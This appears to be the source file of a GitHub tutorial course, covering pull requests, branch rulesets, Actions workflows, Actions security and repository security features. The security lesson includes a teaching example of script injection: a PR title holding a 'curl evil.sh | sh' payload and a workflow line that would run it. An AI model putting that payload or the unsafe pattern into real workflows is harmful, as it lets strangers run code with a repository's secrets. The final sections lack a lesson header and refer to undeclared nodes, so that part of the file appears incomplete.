## Collaboration
# gh-pr | Pull requests and review | Beginner | Proposing a change and agreeing on it.
@ d laptop 0 0 Author
@ b flag 1 0 Branch
@ pr board 2 0 Pull request
@ rv user 2 1 Reviewer
@ ci gear 3 1 Checks
@ m db 3 0 main
= Push a branch
+ d b
~ d>b push
Never work directly on `main`. Create a branch for one task, commit, then publish the branch to GitHub:
$ git switch -c add-search
- switch -c add-search = create and move to a branch named after the task
$ git push -u origin add-search
- push = upload the branch's commits
- -u = link local `add-search` to `origin/add-search`, so later a plain `git push` is enough
- origin = GitHub
- add-search = the branch to upload
= Open a pull request
+ pr
~ b>pr propose
A **pull request** (PR) says: "here is a branch, please review it and merge it into `main`". It shows every changed line and holds the whole conversation about the change.
$ gh pr create --fill
- gh pr create = open a pull request for the current branch
- --fill = use the commit messages as title and description
$ gh pr create --title "Add product search" --body "Closes #42" --reviewer bob
- --title / --body = write them yourself
- Closes #42 = closes issue 42 when merged
- --reviewer bob = ask bob to review
Write **why** the change is needed, how you tested it, and add a screenshot for visual changes.
= Automatic checks
+ ci
~ pr>ci run ;; ci>pr green
: ci ok passed
Workflows run on the proposed change: tests, linters, a build. Their results appear at the bottom of the PR as green ticks or red crosses. Reviewers can trust that the basics work before reading the code.
$ gh pr checks
- gh pr checks = show the status of every check on this PR
= Human review
" rv Please add a test.
+ rv
~ rv>pr comments ;; d>b fix
Reviewers read the changes in the **Files changed** tab. They can:
- **Comment** on any line, or suggest an exact replacement;
- **Approve** the change;
- **Request changes**, which blocks merging until addressed.
The author answers by pushing more commits to the same branch; the PR updates by itself.
! Keep pull requests small: under about 400 changed lines. Big PRs get shallow reviews and hide bugs.
= Merge and clean up
+ m
~ pr>m squash
| Merge button | Result on main |
| Create a merge commit | All commits of the branch, plus a merge commit |
| Squash and merge | All the branch's commits become **one** commit |
| Rebase and merge | The commits are replayed on main, no merge commit |
$ gh pr merge --squash --delete-branch
- --squash = squash and merge
- --delete-branch = delete the branch on GitHub and locally afterwards
Then update your own copy:
$ git switch main
$ git pull
? What does squash merge produce? | A merge commit with all commits | *One commit on main | No commit
^ https://docs.github.com/en/pull-requests GitHub Docs: pull requests

# gh-protect | Forks, rulesets and code owners | Intermediate | Guarding the main branch.
@ f db 0 0 Fork
@ u db 2 0 Upstream
@ g gate 1 0 Ruleset
@ o user 1 1 Code owner
@ c gear 2 1 Required check
= Forks
+ f u
~ u>f fork ;; f>u pull request
People without write access work through a **fork**: their own copy of the repository. They push to their fork and open a pull request back to the original (**upstream**). The maintainers stay in control of what gets in.
= Anyone can push? | PROBLEM
~ !f>u direct push
: u err broken main
Even trusted team members make mistakes. Without rules, anyone with write access can:
- push untested code straight to `main`;
- force-push and rewrite history, deleting other people's commits;
- delete the branch by accident.
= Rulesets | SOLUTION
+ g c
* g
~ c>g must pass
A **ruleset** (Settings, Rules, Rulesets) protects branches and tags. Common rules for `main`:
- **Require a pull request** before merging, with at least one approval;
- **Require status checks to pass**, naming the CI jobs that must be green;
- **Block force pushes** and **restrict deletions**;
- **Require linear history**, if you want no merge commits.
Rulesets can target many branches by pattern (for example `release/*`) and can let a few admins bypass them in emergencies.
= CODEOWNERS
+ o
~ o>g approves
A file named `CODEOWNERS` (in `.github/`) maps paths to the people or teams who must review changes there:
> *.js          @acme/frontend
> /infra/       @acme/platform
> /docs/        @maria
- *.js = any JavaScript file
- /infra/ = everything in the infra folder
- @acme/platform = a team in the acme organisation; `@maria` is one person
With "require review from code owners" turned on, a change to `/infra/` cannot be merged until someone from the platform team approves it.
= Merge queue
* u
~ g>u one at a time
Two pull requests can each pass their tests alone, yet break `main` when both are merged. A **merge queue** lines up approved PRs and tests each one together with the PRs ahead of it, then merges them in that order. Busy repositories use it to keep `main` always green.
? Who must review files listed in CODEOWNERS? | Anyone | *The owners of that path | The author
^ https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets GitHub Docs: rulesets

# gh-actions | GitHub Actions | Beginner | Workflows, jobs, steps and runners.
@ e flag 0 0 Event
@ w doc 1 0 Workflow
@ j1 gear 2 0 Job: test
@ j2 gear 3 0 Job: build
@ r server 2 1 Runner
@ art box 3 1 Artifact
= An event starts it
+ e w
~ e>w push
A workflow is a YAML file in `.github/workflows/`. The `on:` key lists the **events** that start it:
| Event | Starts when |
| `push` | Commits are pushed |
| `pull_request` | A PR is opened or updated |
| `schedule` | A time, written like cron: `'0 3 * * *'` |
| `workflow_dispatch` | Someone clicks **Run workflow** |
| `release` | A release is published |
= Jobs and runners
+ j1 r
~ w>j1 ;; j1>r runs on
Each job gets a **fresh** runner: a clean virtual machine that is thrown away afterwards. Nothing from the last run is left over, so results are repeatable.
Steps inside one job run in order and share the same disk. Different jobs do **not** share files.
= Read the file line by line
> on: [push]
> permissions:
>   contents: read
> jobs:
>   test:
>     runs-on: ubuntu-latest
>     steps:
>       - uses: actions/checkout@<full-commit-sha>
>       - uses: actions/setup-node@<full-commit-sha>
>         with:
>           node-version: 22
>       - run: npm ci
>       - run: npm test
- permissions: contents: read = the job's token may only read the code
- runs-on: ubuntu-latest = the runner type
- uses: actions/checkout@… = download the repository; pinned to an exact commit for safety
- with: node-version: 22 = an input given to the action
- run: npm ci = install exact dependency versions from the lockfile
- run: npm test = run the tests; a failure makes the job red
= Order and matrix
+ j2
~ j1>j2 needs
> build:
>   needs: test
>   strategy:
>     matrix:
>       node: [22, 24]
- needs: test = start only after `test` succeeded
- matrix: node: [22, 24] = run this job twice, once per value; use it as `${{ matrix.node }}`
= Pass files along
+ art
~ j2>art upload
Because jobs do not share disks, a build result is passed as an **artifact**:
> - uses: actions/upload-artifact@<sha>
>   with:
>     name: site
>     path: dist/
- name: site = the artifact's name
- path: dist/ = which files to upload
A later job downloads it with `actions/download-artifact`. A **cache** is different: it only speeds up repeated downloads (such as dependencies), and the job must still work if the cache is empty.
= Environments
: j2 warn waiting for approval
A job with `environment: production` uses that environment's secrets and waits for any required approvals. The run shows "Waiting" until a named reviewer approves.
? How do two jobs share a build result? | Same disk | *Artifacts | Environment variables
^ https://docs.github.com/en/actions GitHub Docs: Actions

# gh-actions-sec | Securing Actions | Advanced | Tokens, pinning, OIDC and untrusted code.
@ f user 0 0 Fork author
@ w gear 1 0 Workflow
@ t key 1 1 GITHUB_TOKEN
@ a box 2 0 Third-party action
@ c cloud 2 1 Cloud
= Least privilege
+ w t
* t
: t ok read only
Every run receives a temporary token, `GITHUB_TOKEN`, that can act on the repository. If a step is compromised, the attacker gets whatever that token may do.
> permissions:
>   contents: read
- permissions = set what the token may do. Once you list any permission, all unlisted ones become **none**
Set read-only at the top, then give a single job more, for example `packages: write` only in the publish job.
= Pin actions
+ a
~ a>w code
: a warn tag can move
`uses: someone/action@v4` runs whatever code the tag `v4` points to **today**. If that account is hacked, the tag can be moved to malicious code, and your next run executes it with your secrets.
> uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
- @11bd719… = a full commit SHA: it can never point to different code
Tools such as Dependabot can still propose updates to newer pinned versions.
= Cloud without keys
+ c
~ w>c OIDC token ;; c>w short-lived access
Storing a cloud access key as a secret means a long-lived key that can leak. With **OIDC** (OpenID Connect), the job asks GitHub for a signed token that says "I am repository acme/shop, branch main". The cloud checks it and returns **temporary** credentials that expire in an hour.
> permissions:
>   id-token: write
- id-token: write = allow the job to request that OIDC token
= Untrusted code | RISK
+ f
~ !f>w pull_request_target
: w err has secrets
The `pull_request_target` event runs with the **base** repository's token and secrets, even for a PR from a stranger's fork. If the workflow checks out the fork's code and runs it (`npm install`, `make`), that code can read and send away your secrets.
!! Use plain `pull_request` to build and test code from forks. Use `pull_request_target` only for actions that never run the PR's code, such as adding labels.
= Script injection
~ !f>w title text
Text controlled by others, such as a PR title, can contain shell code. This is unsafe:
> run: echo "${{ github.event.pull_request.title }}"
A title like `"; curl evil.sh | sh; "` would run. Pass it through an environment variable instead, which is never parsed as code:
> env:
>   TITLE: ${{ github.event.pull_request.title }}
> run: echo "$TITLE"
? Strongest common way to reference an action by version? | @main | @v4 | *A full commit SHA
^ https://docs.github.com/en/actions/reference/security/secure-use Secure use reference

= Dependencies: Dependabot
+ r d
~ d>r update PR
Most of your code is other people's libraries. **Dependabot** compares your dependency files (package.json, requirements.txt, pom.xml…) with a database of known vulnerabilities, raises **alerts**, and opens pull requests that update to a fixed version.
> version: 2
> updates:
>   - package-ecosystem: npm
>     directory: /
>     schedule:
>       interval: weekly
- package-ecosystem: npm = which kind of dependencies to check
- directory: / = where the dependency file is
- interval: weekly = how often to look for new versions
This goes in `.github/dependabot.yml`.
= Secrets: scanning and push protection
+ s
~ !r>s token found
**Secret scanning** looks for known token formats (AWS keys, GitHub tokens, Stripe keys…) in your code and history.
**Push protection** goes further: it checks every push and **blocks** it if it contains a secret, before it ever reaches GitHub. The developer sees the file and line and removes it.
!! If a secret was pushed anyway, revoke it first. Deleting it in a new commit leaves it in history.
= Code: CodeQL
+ c
~ c>r alert
**Code scanning** with CodeQL analyses your source code for dangerous patterns, such as user input reaching an SQL query unchecked (SQL injection). Results appear as alerts and as comments on pull requests. Turn it on in **Security, Code scanning**.
= Plan and report
* r
- **Issues, labels, milestones** and **Projects** track the work.
- **Discussions** hold questions and ideas that are not tasks.
- **SECURITY.md** tells people how to report a vulnerability privately, instead of opening a public issue that attackers can read.
- **Private vulnerability reporting** gives reporters a private form on GitHub.
= Publish
+ p
~ r>p release
- **Releases** attach notes and files (installers, archives) to a Git tag.
- **Packages** hosts container images and libraries (npm, Maven, NuGet…).
- **Pages** serves a static website straight from a repository.
$ gh release create v1.2.0 dist/*.zip --notes "Search and faster checkout"
- gh release create v1.2.0 = create a release for tag v1.2.0 (the tag is created if missing)
- dist/*.zip = files to attach
- --notes "…" = the release notes
